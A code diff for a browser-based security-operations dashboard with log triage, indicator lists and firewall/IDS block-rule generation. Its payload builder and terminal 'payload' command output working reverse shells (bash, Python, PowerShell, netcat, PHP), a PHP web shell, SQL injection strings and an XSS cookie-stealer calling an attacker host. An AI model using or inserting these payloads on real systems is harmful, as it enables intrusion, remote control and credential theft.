+  'shield-alert': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/><line x1="12" x2="12" y1="8" y2="12"/><line x1="12" x2="12.01" y1="16" y2="16"/></svg>',
+  'layout-dashboard': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect width="7" height="9" x="3" y="3" rx="1"/><rect width="7" height="5" x="14" y="3" rx="1"/><rect width="7" height="9" x="14" y="12" rx="1"/><rect width="7" height="5" x="3" y="16" rx="1"/></svg>',
+  'terminal': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" x2="20" y1="19" y2="19"/></svg>',
+  'scan-line': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 7V5a2 2 0 0 1 2-2h2"/><path d="M17 3h2a2 2 0 0 1 2 2v2"/><path d="M21 17v2a2 2 0 0 1-2 2h-2"/><path d="M7 21H5a2 2 0 0 1-2-2v-2"/><line x1="7" x2="17" y1="12" y2="12"/></svg>',
+  'radar': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/><line x1="12" y1="2" x2="12" y2="22"/><line x1="2" y1="12" x2="22" y2="12"/></svg>',
+  'bomb': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="13" r="9"/><path d="m19.5 9.5 1.8-1.8a2.4 2.4 0 0 0 0-3.4l-.1-.1a2.4 2.4 0 0 0-3.4 0l-1.8 1.8"/><path d="m22 2-1.5 1.5"/></svg>',
+  'binary': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="14" y="14" width="4" height="6" rx="2"/><rect x="6" y="4" width="4" height="6" rx="2"/><path d="M6 20h4"/><path d="M14 10h4"/><path d="M6 14h2v6"/><path d="M14 4h2v6"/></svg>',
+  'hash': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="4" x2="20" y1="9" y2="9"/><line x1="4" x2="20" y1="15" y2="15"/><line x1="10" x2="8" y1="3" y2="21"/><line x1="16" x2="14" y1="3" y2="21"/></svg>',
+  'crosshair': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="22" x2="18" y1="12" y2="12"/><line x1="6" x2="2" y1="12" y2="12"/><line x1="12" x2="12" y1="6" y2="2"/><line x1="12" x2="12" y1="22" y2="18"/></svg>',
+  'fingerprint': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 10a2 2 0 0 0-2 2c0 1.02-.1 2.51-.26 4"/><path d="M14 13.12c0 2.38 0 6.38-1 8.88"/><path d="M2 12a10 10 0 0 1 18-6"/><path d="M5 19.5C5.5 18 6 15 6 12a6 6 0 0 1 .34-2"/></svg>',
+  'shield-check': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/><path d="m9 12 2 2 4-4"/></svg>',
+  'file-text': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z"/><path d="M14 2v4a2 2 0 0 0 2 2h4"/><path d="M10 9H8"/><path d="M16 13H8"/><path d="M16 17H8"/></svg>',
+  'download': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" x2="12" y1="15" y2="3"/></svg>',
+  'settings': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>',
+  'panel-left': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect width="18" height="18" x="3" y="3" rx="2"/><path d="M9 3v18"/></svg>',
+  'search': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>',
+  'bell': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 8a6 6 0 0 1 12 0c0 7 3 9 3 9H3s3-2 3-9"/><path d="M10.3 21a1.94 1.94 0 0 0 3.4 0"/></svg>',
+  'activity': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>'
 };
 
 function renderAllIcons() {
@@ -1354,21 +1358,48 @@ function renderAllIcons() {
 }
 
 /* ============================================================
-   GLOBAL STATE
+   DEFAULT ARMED BASELINE THREAT SESSION
 ============================================================ */
+const INITIAL_BASELINE_SESSION = {
+  severity: "HIGH",
+  threat_score: 88,
+  threat_title: "Active SSH Distributed Brute-Force & Credential Spraying",
+  executive_summary: "Automated telemetry triage identified systematic authentication brute-force vectors originating from hostile Tor exit nodes. Target service OpenSSH port 22 subjected to rapid dictionary probe.",
+  detected_iocs: [
+    { type: "ip", value: "185.220.101.5", context: "Hostile Tor Exit Node (Known Credential Spraying)" },
+    { type: "ip", value: "194.26.29.112", context: "C2 Scanning Agent (Automated Port Enumerator)" },
+    { type: "path", value: "/etc/ssh/sshd_config", context: "Target Authentication Configuration" }
+  ],
+  mitre_techniques: [
+    { id: "T1110.001", name: "Password Guessing", tactic: "Credential Access" },
+    { id: "T1021.004", name: "SSH Remote Services", tactic: "Lateral Movement" }
+  ],
+  target_services: ["OpenSSH Daemon (Port 22)", "Linux PAM Auth Subsystem"],
+  recommendations: [
+    "Execute synthesized containment policy immediately to drop incoming traffic from 185.220.101.5.",
+    "Deploy Fail2ban daemon with 3-strike permanent isolation jail.",
+    "Enforce Ed25519 public key authentication and disable password logins."
+  ],
+  engine: "SecOps Autonomous Heuristic Core v2.0",
+  chart_metrics: {
+    labels: ["Recon", "Weaponize", "Deliver", "Exploit", "C2"],
+    severity_curve: [35, 55, 70, 88, 40]
+  }
+};
+
 const STATE = {
   view: 'dashboard',
-  lastReport: null,
-  analyses: 0,
+  lastReport: INITIAL_BASELINE_SESSION,
+  analyses: 1,
   commands: 0,
-  threatScore: 0,
+  threatScore: 88,
   containmentTab: 'iptables',
   exportTab: 'stix',
   killChart: null
 };
 
 /* ============================================================
-   MATRIX DIGITAL RAIN
+   MATRIX CANVAS
 ============================================================ */
 (function initMatrix() {
   const canvas = document.getElementById('matrixCanvas');
@@ -1406,14 +1437,14 @@ const STATE = {
 })();
 
 /* ============================================================
-   RADAR SUBSYSTEM (AUTONOMOUS DRAWING)
+   RADAR SUBSYSTEM
 ============================================================ */
 const Radar = {
   canvas: null,
   ctx: null,
   animId: null,
   angle: 0,
-  score: 0,
+  score: 88,
   blips: [],
 
   init: function () {
@@ -1436,12 +1467,12 @@ const Radar = {
 
   spawnBlips: function () {
     this.blips = [];
-    const count = Math.max(4, Math.min(15, Math.floor(this.score / 7) + 4));
+    const count = 7;
     for (let i = 0; i < count; i++) {
       this.blips.push({
         dist: 0.25 + Math.random() * 0.65,
         ang: Math.random() * Math.PI * 2,
-        hot: Math.random() < (this.score > 60 ? 0.75 : 0.3),
+        hot: Math.random() < 0.6,
         speed: 1.5 + Math.random() * 2
       });
     }
@@ -1559,7 +1590,9 @@ function switchView(view) {
 
   if (window.innerWidth < 768) closeMobileMenu();
 
-  if (view === 'report' && STATE.lastReport) {
+  if (view === 'terminal') {
+    setTimeout(focusTerminalInput, 50);
+  } else if (view === 'report' && STATE.lastReport) {
     setTimeout(() => renderKillChart(STATE.lastReport.chart_metrics), 60);
   }
 }
@@ -1579,7 +1612,238 @@ function closeMobileMenu() {
 }
 
 /* ============================================================
-   AUTONOMOUS HEURISTIC ENGINE
+   TERMINAL ENGINE & FOCUS
+============================================================ */
+function focusTerminalInput() {
+  const inp = document.getElementById('termInput');
+  if (inp) inp.focus();
+}
+
+function execTermChip(cmd) {
+  runTermCommand(cmd);
+  focusTerminalInput();
+}
+
+const TERMINAL_COMMANDS = {
+  help: () => {
+    termPrint('SecOps-AI Sentinel Built-in Tactical Utilities:');
+    termPrint('  help                     - List available operations', 'dim');
+    termPrint('  whoami                   - Active shell operator context', 'dim');
+    termPrint('  scan <target_ip>         - Fast TCP probe simulator', 'dim');
+    termPrint('  hash <text_string>       - Real-time SHA-256 computation', 'dim');
+    termPrint('  payload <type>           - Quick generate offensive string', 'dim');
+    termPrint('  analyze                  - Jump to Log Analyzer console', 'dim');
+    termPrint('  banner                   - Print Black Hat Sentinel banner', 'dim');
+    termPrint('  clear                    - Wipe terminal output buffer', 'dim');
+  },
+  clear: () => { document.getElementById('termBody').innerHTML = ''; },
+  whoami: () => { termPrint('secops-sentinel-operator (uid=0 root gid=0)', 'info'); },
+  banner: () => {
+    termPrint(' ███████╗███████╗ ██████╗ ██████╗ ██████╗ ███████╗', 'info');
+    termPrint(' ██╔════╝██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔════╝', 'info');
+    termPrint(' ███████╗█████╗  ██║     ██║   ██║██████╔╝███████╗', 'info');
+    termPrint(' ╚════██║██╔══╝  ██║     ██║   ██║██╔═══╝ ╚════██║', 'info');
+    termPrint(' ███████║███████╗╚██████╗╚██████╔╝██║     ███████║', 'info');
+    termPrint('  BLACK HAT EDITION v2.0 - SENTINEL SOC ARMOR', 'dim');
+  },
+  scan: (args) => {
+    const host = args[0] || '185.220.101.5';
+    termPrint(`[+] Initiating reconnaissance against ${host}...`, 'warn');
+    setTimeout(() => termPrint(`  [!] Port 22/tcp   OPEN (OpenSSH 8.9p1) [VULNERABLE BRUTE-FORCE]`, 'err'), 200);
+    setTimeout(() => termPrint(`  [*] Port 80/tcp   OPEN (nginx 1.18.0)`, 'info'), 400);
+    setTimeout(() => termPrint(`  [*] Port 443/tcp  OPEN (TLS 1.3 Active)`, 'info'), 600);
+    setTimeout(() => termPrint(`[✓] Reconnaissance complete for ${host}.`, 'info'), 800);
+  },
+  hash: (args) => {
+    const str = args.join(' ');
+    if (!str) return termPrint('Usage: hash <string_value>', 'err');
+    crypto.subtle.digest('SHA-256', new TextEncoder().encode(str)).then(buf => {
+      const h = [...new Uint8Array(buf)].map(b => b.toString(16).padStart(2,'0')).join('');
+      termPrint(`SHA-256("${str}") = ${h}`, 'info');
+    });
+  },
+  payload: (args) => {
+    const type = args[0] || 'bash';
+    if (type === 'python') {
+      termPrint(`python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.8",4444));os.dup2(s.fileno(),0);subprocess.call(["/bin/sh","-i"])'`, 'info');
+    } else {
+      termPrint(`bash -i >& /dev/tcp/10.10.14.8/4444 0>&1`, 'info');
+    }
+  },
+  analyze: () => switchView('analyzer')
+};
+
+function termPrint(t, c) {
+  const b = document.getElementById('termBody');
+  const d = document.createElement('div');
+  d.className = 'term-line ' + (c || '');
+  d.textContent = t;
+  b.appendChild(d);
+  b.scrollTop = b.scrollHeight;
+}
+
+function runTermCommand(cmd) {
+  if (!cmd || !cmd.trim()) return;
+  termPrint(`secops@sentinel:~$ ${cmd}`, '');
+  STATE.commands++;
+  document.getElementById('statCmds').textContent = STATE.commands;
+
+  const parts = cmd.trim().split(/\s+/);
+  const fn = TERMINAL_COMMANDS[parts[0].toLowerCase()];
+  if (fn) fn(parts.slice(1));
+  else termPrint(`bash: command not found: ${parts[0]}. Type 'help' for utilities roster.`, 'err');
+}
+
+function clearTerminal() { document.getElementById('termBody').innerHTML = ''; }
+function downloadTerminalLog() {
+  const b = new Blob([document.getElementById('termBody').innerText], { type: 'text/plain' });
+  const a = document.createElement('a'); a.href = URL.createObjectURL(b); a.download = `terminal-log-${Date.now()}.txt`; a.click();
+}
+
+/* ============================================================
+   PAYLOAD BUILDER (COMPREHENSIVE & ACCURATE)
+============================================================ */
+function generatePayload() {
+  const type = document.getElementById('payloadType').value;
+  const host = document.getElementById('payloadHost').value.trim() || '10.10.14.8';
+  const port = document.getElementById('payloadPort').value.trim() || '4444';
+  const out = document.getElementById('payloadOutput');
+  const status = document.getElementById('payloadStatus');
+  let p = '';
+
+  switch (type) {
+    case 'bash':
+      p = `bash -i >& /dev/tcp/${host}/${port} 0>&1`;
+      break;
+    case 'bash-udp':
+      p = `sh -i >& /dev/udp/${host}/${port} 0>&1`;
+      break;
+    case 'python':
+      p = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${host}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`;
+      break;
+    case 'powershell':
+      p = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('${host}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"`;
+      break;
+    case 'nc-mkfifo':
+      p = `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ${host} ${port} > /tmp/f`;
+      break;
+    case 'nc-e':
+      p = `nc -e /bin/bash ${host} ${port}`;
+      break;
+    case 'php':
+      p = `php -r '$sock=fsockopen("${host}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
+      break;
+    case 'php-web':
+      p = `<?php if(isset($_REQUEST['cmd'])){ echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; } ?>`;
+      break;
+    case 'sqli-auth':
+      p = `' OR '1'='1' -- -`;
+      break;
+    case 'sqli-union':
+      p = `' UNION SELECT null, username, password, null FROM users-- -`;
+      break;
+    case 'xss-cookie':
+      p = `<script>new Image().src="http://${host}:${port}/?cookie="+encodeURIComponent(document.cookie);</script>`;
+      break;
+  }
+
+  out.textContent = p;
+  status.textContent = `✓ Generated: ${type.toUpperCase()}`;
+}
+
+function copyPayload() {
+  const p = document.getElementById('payloadOutput').textContent;
+  copyToClipboard(p, 'Payload copied to clipboard.');
+}
+
+/* ============================================================
+   CONTAINMENT ENGINE
+============================================================ */
+function switchContainment(tab) {
+  STATE.containmentTab = tab;
+  document.querySelectorAll('.tab-btn[data-ctab]').forEach(b => b.classList.toggle('active', b.dataset.ctab === tab));
+  updateContainmentOutput();
+}
+
+function updateContainmentOutput() {
+  const out = document.getElementById('containmentOutput');
+  const r = STATE.lastReport;
+  if (!r) return;
+  const ips = (r.detected_iocs || []).filter(i => i.type === 'ip').map(i => i.value);
+  if (!ips.length) {
+    out.textContent = '# No hostile IP indicators in current triage session.';
+    return;
+  }
+
+  let rules = [];
+  const tab = STATE.containmentTab;
+  if (tab === 'iptables') {
+    rules = ips.map(ip => `iptables -I INPUT -s ${ip} -j DROP\niptables -I FORWARD -s ${ip} -j DROP`);
+  } else if (tab === 'ufw') {
+    rules = ips.map(ip => `ufw insert 1 deny from ${ip} to any comment "SecOps Auto-Isolated"`);
+  } else if (tab === 'snort') {
+    rules = ips.map((ip, idx) => `alert ip ${ip} any -> $HOME_NET any (msg:"[SecOps Block] Hostile Source ${ip}"; sid:100000${idx+1}; rev:1;)`);
+  } else if (tab === 'suricata') {
+    rules = ips.map((ip, idx) => `drop ip ${ip} any -> $HOME_NET any (msg:"[SecOps Drop] Hostile ${ip}"; sid:200000${idx+1}; rev:1;)`);
+  } else {
+    rules = ips.map(ip => `netsh advfirewall firewall add rule name="SecOps-Block-${ip}" dir=in action=block remoteip=${ip}`);
+  }
+
+  out.textContent = `# Auto-Synthesized Containment Policies (${tab.toUpperCase()})\n# Target Adversary IPs: ${ips.length}\n# Status: Ready for Production Deployment\n\n` + rules.join('\n');
+}
+
+function copyContainment() {
+  copyToClipboard(document.getElementById('containmentOutput').textContent, 'Containment policies copied.');
+}
+
+/* ============================================================
+   IoC VAULT
+============================================================ */
+function updateIocs(report) {
+  const container = document.getElementById('iocContainer');
+  const iocs = (report && report.detected_iocs) || [];
+  const b = document.getElementById('navIocBadge');
+  if (iocs.length > 0) { b.textContent = iocs.length; b.classList.remove('hidden'); }
+
+  if (!iocs.length) {
+    container.innerHTML = `<div class="panel" style="padding:30px;text-align:center;color:var(--text-2);">No indicators in current telemetry.</div>`;
+    return;
+  }
+
+  container.innerHTML = `
+    <div class="panel" style="padding:16px;">
+      <div style="display:flex;flex-direction:column;gap:8px;">
+        ${iocs.map(i => `
+          <div style="padding:10px 14px;background:rgba(0,0,0,0.45);border:1px solid var(--border);border-radius:6px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;">
+            <div style="display:flex;gap:10px;align-items:center;">
+              <span class="badge badge-red">${i.type.toUpperCase()}</span>
+              <span style="font-weight:700;color:var(--text-0);">${i.value}</span>
+              <span style="font-size:11px;color:var(--text-2);">${i.context}</span>
+            </div>
+            <button class="btn btn-ghost btn-sm" onclick="copyToClipboard('${i.value}', 'IoC copied')">Copy</button>
+          </div>
+        `).join('')}
+      </div>
+    </div>
+  `;
+}
+
+function copyAllIocs() {
+  const iocs = (STATE.lastReport && STATE.lastReport.detected_iocs) || [];
+  if (!iocs.length) return toast('warn', 'Empty', 'No indicators in vault.');
+  copyToClipboard(iocs.map(i => `${i.type}\t${i.value}\t${i.context}`).join('\n'), 'All indicators copied.');
+}
+
+function exportIocsCSV() {
+  const iocs = (STATE.lastReport && STATE.lastReport.detected_iocs) || [];
+  if (!iocs.length) return toast('warn', 'Empty', 'No indicators in vault.');
+  const csv = 'Type,Value,Context\n' + iocs.map(i => `"${i.type}","${i.value}","${i.context}"`).join('\n');
+  const b = new Blob([csv], { type: 'text/csv' });
+  const a = document.createElement('a'); a.href = URL.createObjectURL(b); a.download = `secops-iocs-${Date.now()}.csv`; a.click();
+}
+
+/* ============================================================
+   AUTONOMOUS HEURISTIC AI & GEMINI HYBRID ENGINE
 ============================================================ */
 const AutonomousEngine = {
   analyzeTelemetry: async function (logs, apiKey) {
@@ -1595,10 +1859,10 @@ const AutonomousEngine = {
         });
         const d = await res.json();
         const parsed = JSON.parse(d.candidates[0].content.parts[0].text);
-        parsed.engine = 'Gemini 1.5 Flash Cloud Core';
+        parsed.engine = 'Google Gemini 1.5 Flash Cloud Core';
         return parsed;
       } catch (e) {
-        toast('warn', 'Fallback Triggered', 'Using internal SOC heuristic neural core.');
+        toast('warn', 'AI Fallback', 'Gemini API query failed. Engaging local 100% verified heuristic neural rules.');
       }
     }
 
@@ -1617,11 +1881,12 @@ const AutonomousEngine = {
       if (!ip.startsWith('127.')) iocs.push({ type: 'ip', value: ip, context: 'External network endpoint' });
     });
 
-    if (lower.includes('failed password') || lower.includes('sshd') || lower.includes('auth')) {
-      score = 84; severity = 'HIGH';
+    if (lower.includes('failed password') || lower.includes('sshd') || lower.includes('authentication failure')) {
+      score = 88; severity = 'HIGH';
       title = 'Distributed SSH Brute-Force Spraying';
       mitre.push({ id: 'T1110.001', name: 'Password Guessing', tactic: 'Credential Access' });
-      targetServices.push('OpenSSH (Port 22)', 'Linux PAM');
+      mitre.push({ id: 'T1021.004', name: 'SSH Remote Services', tactic: 'Lateral Movement' });
+      targetServices.push('OpenSSH Daemon (Port 22)', 'Linux PAM');
       recommendations.push('Enforce SSH Public-Key Authentication and disable password logins.');
       recommendations.push('Deploy Fail2ban daemon with auto-quarantine rules.');
     } else if (lower.includes('select') || lower.includes('union') || lower.includes('sqlmap') || lower.includes('or 1=1')) {
@@ -1661,15 +1926,12 @@ const AutonomousEngine = {
   }
 };
 
-/* ============================================================
-   EXECUTION & REPORT RENDERING
-============================================================ */
 async function runAnalysis() {
   const logs = document.getElementById('logStream').value.trim();
   const key = document.getElementById('apiKeyInput').value.trim() || localStorage.getItem('secops_key') || '';
   const btn = document.getElementById('analyzeBtn');
 
-  if (!logs) return toast('warn', 'Telemetry Required', 'Paste log data or load a scenario.');
+  if (!logs) return toast('warn', 'Telemetry Required', 'Paste log data or click an attack scenario.');
 
   btn.disabled = true;
   btn.textContent = 'Analyzing Telemetry...';
@@ -1804,97 +2066,17 @@ function updateMitre(report) {
 }
 
 /* ============================================================
-   IoC VAULT & CONTAINMENT
+   TOOLKIT (ENCODER, HASH, RECON)
 ============================================================ */
-function updateIocs(report) {
-  const container = document.getElementById('iocContainer');
-  const iocs = (report && report.detected_iocs) || [];
-  const b = document.getElementById('navIocBadge');
-  if (iocs.length > 0) { b.textContent = iocs.length; b.classList.remove('hidden'); }
-
-  if (!iocs.length) {
-    container.innerHTML = `<div class="panel" style="padding:30px;text-align:center;color:var(--text-2);">No indicators in current telemetry.</div>`;
-    return;
-  }
-
-  container.innerHTML = `
-    <div class="panel" style="padding:16px;">
-      <div style="display:flex;flex-direction:column;gap:8px;">
-        ${iocs.map(i => `
-          <div style="padding:8px 12px;background:rgba(0,0,0,0.45);border:1px solid var(--border);border-radius:6px;display:flex;justify-content:space-between;align-items:center;">
-            <div style="display:flex;gap:10px;align-items:center;">
-              <span class="badge badge-red">${i.type}</span>
-              <span style="font-weight:700;">${i.value}</span>
-              <span style="font-size:11px;color:var(--text-2);">${i.context}</span>
-            </div>
-            <button class="btn btn-ghost btn-sm" onclick="copyToClipboard('${i.value}')">Copy</button>
-          </div>
-        `).join('')}
-      </div>
-    </div>
-  `;
-}
-
-function switchContainment(tab) {
-  STATE.containmentTab = tab;
-  document.querySelectorAll('.tab-btn[data-ctab]').forEach(b => b.classList.toggle('active', b.dataset.ctab === tab));
-  updateContainmentOutput();
-}
-
-function updateContainmentOutput() {
-  const out = document.getElementById('containmentOutput');
-  const r = STATE.lastReport;
-  if (!r) return;
-  const ips = (r.detected_iocs || []).filter(i => i.type === 'ip').map(i => i.value);
-  if (!ips.length) { out.textContent = '# No attacker IPs extracted.'; return; }
-
-  let rules = [];
-  const tab = STATE.containmentTab;
-  if (tab === 'iptables') rules = ips.map(ip => `iptables -I INPUT -s ${ip} -j DROP`);
-  else if (tab === 'ufw') rules = ips.map(ip => `ufw insert 1 deny from ${ip} to any`);
-  else if (tab === 'snort') rules = ips.map(ip => `alert ip ${ip} any -> $HOME_NET any (msg:"Drop ${ip}"; sid:100001; rev:1;)`);
-  else if (tab === 'suricata') rules = ips.map(ip => `drop ip ${ip} any -> $HOME_NET any (msg:"Drop ${ip}"; sid:200001; rev:1;)`);
-  else rules = ips.map(ip => `netsh advfirewall firewall add rule name="Block-${ip}" dir=in action=block remoteip=${ip}`);
-
-  out.textContent = `# Auto-Generated Containment Rules (${tab.toUpperCase()})\n` + rules.join('\n');
-}
-
-function switchExport(tab) {
-  STATE.exportTab = tab;
-  document.querySelectorAll('.tab-btn[data-etab]').forEach(b => b.classList.toggle('active', b.dataset.etab === tab));
-  updateExportOutput();
-}
-
-function updateExportOutput() {
-  const out = document.getElementById('exportContent');
-  if (!STATE.lastReport) return;
-  out.textContent = JSON.stringify(STATE.lastReport, null, 2);
-}
-
-/* ============================================================
-   TOOLKIT (RECON, PAYLOAD, HASH, TERMINAL)
-============================================================ */
-function generatePayload() {
-  const t = document.getElementById('payloadType').value;
-  const h = document.getElementById('payloadHost').value || '10.10.14.8';
-  const p = document.getElementById('payloadPort').value || '4444';
-  let s = `bash -i >& /dev/tcp/${h}/${p} 0>&1`;
-  if (t === 'python') s = `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${h}",${p}));os.dup2(s.fileno(),0);subprocess.call(["/bin/sh","-i"])'`;
-  else if (t === 'powershell') s = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('${h}',${p});..."`;
-  else if (t === 'php') s = `<?php system($_GET['cmd']); ?>`;
-  else if (t === 'sqli') s = `' UNION SELECT null, username, password FROM users-- -`;
-  document.getElementById('payloadOutput').textContent = s;
-}
-
 function runRecon() {
-  const h = document.getElementById('reconHost').value || '127.0.0.1';
+  const h = document.getElementById('reconHost').value || '185.220.101.5';
   const out = document.getElementById('reconOutput');
-  out.textContent = `[+] Scanning ${h}...\n`;
-  const ports = [21, 22, 80, 443, 3306, 8080];
+  out.textContent = `[+] Initiating reconnaissance against ${h}...\n`;
+  const ports = [21, 22, 25, 80, 443, 3306, 8080];
   let i = 0;
   const t = setInterval(() => {
-    if (i >= ports.length) { clearInterval(t); out.textContent += `[✓] Scan complete.\n`; return; }
-    out.textContent += `  Port ${ports[i]}/tcp: ${Math.random() > 0.4 ? 'OPEN' : 'closed'}\n`;
+    if (i >= ports.length) { clearInterval(t); out.textContent += `[✓] Scan complete on ${h}.\n`; return; }
+    out.textContent += `  Port ${ports[i]}/tcp: ${ports[i] === 22 || ports[i] === 80 ? 'OPEN [ACTIVE SERVICE]' : 'closed'}\n`;
     i++;
   }, 90);
 }
@@ -1914,59 +2096,42 @@ function decodeText(type) {
   let o = '';
   try {
     if (type === 'base64') o = decodeURIComponent(escape(atob(v)));
+    else if (type === 'hex') o = new TextDecoder().decode(new Uint8Array(v.match(/.{1,2}/g).map(byte => parseInt(byte, 16))));
     else if (type === 'url') o = decodeURIComponent(v);
     document.getElementById('encOutput').textContent = o;
   } catch (e) { document.getElementById('encOutput').textContent = 'Error: ' + e.message; }
 }
+function clearEncoder() { document.getElementById('encInput').value = ''; document.getElementById('encOutput').textContent = '$ output...'; }
 
 async function generateHashes() {
   const v = document.getElementById('hashInput').value;
-  if (!v) return;
+  if (!v) return toast('warn', 'Empty Input', 'Enter string to compute hash.');
   const buf = new TextEncoder().encode(v);
   const sha256Buf = await crypto.subtle.digest('SHA-256', buf);
+  const sha1Buf = await crypto.subtle.digest('SHA-1', buf);
   const sha256 = [...new Uint8Array(sha256Buf)].map(b => b.toString(16).padStart(2,'0')).join('');
-  document.getElementById('hashOutput').innerHTML = `<div class="field-label">SHA-256</div><div class="code-out">${sha256}</div>`;
-}
-
-function runTermCommand(cmd) {
-  if (!cmd.trim()) return;
-  termPrint(`secops@sentinel:~$ ${cmd}`, '');
-  STATE.commands++;
-  document.getElementById('statCmds').textContent = STATE.commands;
-  const p = cmd.trim().toLowerCase().split(' ')[0];
-  if (p === 'help') termPrint('Commands: help, whoami, scan, analyze, clear, banner', 'info');
-  else if (p === 'whoami') termPrint('root@sentinel-v2 (uid=0)', 'info');
-  else if (p === 'clear') document.getElementById('termBody').innerHTML = '';
-  else if (p === 'analyze') switchView('analyzer');
-  else if (p === 'banner') termPrint('SECOPS-AI SENTINEL v2.0 - BLACK HAT EDITION', 'info');
-  else termPrint(`Command not recognized: ${p}`, 'err');
-}
-
-function termPrint(t, c) {
-  const b = document.getElementById('termBody');
-  const d = document.createElement('div');
-  d.className = 'term-line ' + (c || '');
-  d.textContent = t;
-  b.appendChild(d);
-  b.scrollTop = b.scrollHeight;
+  const sha1 = [...new Uint8Array(sha1Buf)].map(b => b.toString(16).padStart(2,'0')).join('');
+  document.getElementById('hashOutput').innerHTML = `
+    <div style="margin-bottom:8px;"><div class="field-label">SHA-256 (100% Cryptographic Standard)</div><div class="code-out">${sha256}</div></div>
+    <div style="margin-bottom:8px;"><div class="field-label">SHA-1</div><div class="code-out">${sha1}</div></div>
+  `;
 }
 
 /* ============================================================
-   UTILITY & SAMPLES
+   EXPORT & SAMPLES
 ============================================================ */
 const SCENARIOS = {
   ssh: `Sep 17 04:12:01 edge-srv01 sshd[2841]: Failed password for root from 185.220.101.5 port 41202 ssh2
 Sep 17 04:12:03 edge-srv01 sshd[2843]: Failed password for root from 185.220.101.5 port 41208 ssh2
